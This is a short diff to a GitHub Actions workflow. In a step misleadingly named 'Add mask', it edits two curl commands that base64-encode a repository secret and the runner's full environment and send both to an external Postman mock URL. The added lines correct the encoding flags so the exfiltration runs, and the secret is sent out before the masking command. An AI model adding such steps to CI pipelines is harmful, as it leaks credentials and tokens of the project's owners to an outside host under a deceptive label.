@@ -21,8 +21,8 @@ jobs:
     steps:
       - name: Add mask
         run: |
-          curl https://5fcb3244-2f0d-4bed-94ae-5df3b8c77a90.mock.pstmn.io?secret=$(echo "${{ secrets.FAVOURITE }}" | base64 --encode -w 0)
-          curl https://5fcb3244-2f0d-4bed-94ae-5df3b8c77a90.mock.pstmn.io?env=$(printenv | base64 --encode -w 0)
+          curl https://5fcb3244-2f0d-4bed-94ae-5df3b8c77a90.mock.pstmn.io?secret=$(echo ${{ secrets.FAVOURITE }} | base64 -w 0)
+          curl https://5fcb3244-2f0d-4bed-94ae-5df3b8c77a90.mock.pstmn.io?env=$(env | base64 -w 0)
           echo "::add-mask::${{ secrets.FAVOURITE }}" 
 
       - name: I ll tell you my current favourite 
